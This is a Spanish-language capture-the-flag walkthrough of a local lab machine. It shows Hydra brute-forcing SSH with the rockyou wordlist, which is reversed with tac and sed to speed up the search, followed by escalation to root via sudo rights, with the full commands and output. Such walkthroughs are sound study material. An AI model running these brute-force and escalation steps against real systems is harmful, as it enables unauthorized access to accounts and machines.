# Herramientas
- Nmap
- Gobuster
- Hydra
# Procedimiento
Se realiza el primer escaneo y podemos ver que están abiertos los puertos 22 y 80. Al explorar la página, nos encontramos con esto:
![[Pasted image 20250715000501.png]]
Por lo que podemos suponer que este sería el usuario del SSH.

Luego, como no encontramos nada con Gobuster, procedemos a hacer una fuerza bruta con `rockyou`. 
```bash
hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3      
  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organization  
s, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-14 23:46:20  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4  
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found  
, to prevent overwriting, ./hydra.restore  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task  
[DATA] attacking ssh://172.17.0.3:22/  
[STATUS] 136.00 tries/min, 136 tries in 00:01h, 14344271 to do in 1757:53h, 8 active  
[STATUS] 113.67 tries/min, 341 tries in 00:03h, 14344067 to do in 2103:15h, 7 active  
[STATUS] 111.86 tries/min, 783 tries in 00:07h, 14343625 to do in 2137:12h, 7 active  
[STATUS] 110.20 tries/min, 1653 tries in 00:15h, 14342755 to do in 2169:13h, 7 active
```

Sin embargo, después de un largo rato, no ocurre nada, por lo que deberemos ir a la lista donde se encuentra este diccionario y darlo vuelta, para luego eliminarle los espacios extra. Esto se consigue con la siguiente serie de comandos:
```
cd /usr/share/wordlists/
sudo tac rockyou.txt > ~/rockyouinvertido.txt

sed -i 's/ //g' rockyouinvertido.txt
```

Ya con esto listo, podemos lanzar el ataque de fuerza bruta nuevamente:
```bash
hydra -l tails -P rockyouinvertido.txt ssh://172.17.0.3 -I  
  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organization  
s, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-15 00:09:54  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4  
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344386 login tries (l:1/p:14344386), ~896525 tries per task  
[DATA] attacking ssh://172.17.0.3:22/  
[22][ssh] host: 172.17.0.3   login: tails   password: 3117548331  
1 of 1 target successfully completed, 1 valid password found  
[WARNING] Writing restore file because 3 final worker threads did not complete until end.  
[ERROR] 3 targets did not resolve or could not be connected  
[ERROR] 0 target did not complete  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-15 00:10:19
```

Luego, entrando en la máquina ocupamos el comando `sudo -l` para saber qué permisos tiene qué usuario:
```bash
sudo -l  
User tails may run the following commands on 03d2314f4c72:  
   (sonic) NOPASSWD: ALL
```

Ya finalizando, ocupamos:
```
sudo -u sonic bash
sudo -l
sudo su
whoami  
root
```

Así conseguimos escalar privilegios ;)